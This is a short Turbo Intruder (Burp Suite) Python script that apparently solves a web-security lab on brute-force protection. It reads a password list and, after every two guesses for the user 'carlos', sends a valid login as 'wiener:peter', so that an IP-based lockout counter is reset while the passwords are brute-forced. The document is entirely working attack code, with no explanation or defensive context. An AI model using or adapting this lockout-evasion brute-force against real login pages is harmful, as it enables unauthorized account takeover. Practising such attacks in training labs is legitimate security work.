def queueRequests(target, wordlists):

	engine = RequestEngine(endpoint=target.endpoint, concurrentConnections=1, requestsPerConnection=1, pipeline=False)

	engine.start()



	file = open('/home/kali/Desktop/password.txt').read().splitlines()

	for password in zip(*[iter(file)]*2):

		engine.queue(target.req, ['wiener', 'peter'])	

		for p in password:

			engine.queue(target.req, ['carlos', p])

		

def handleResponse(req, interesting):

	table.add(req)
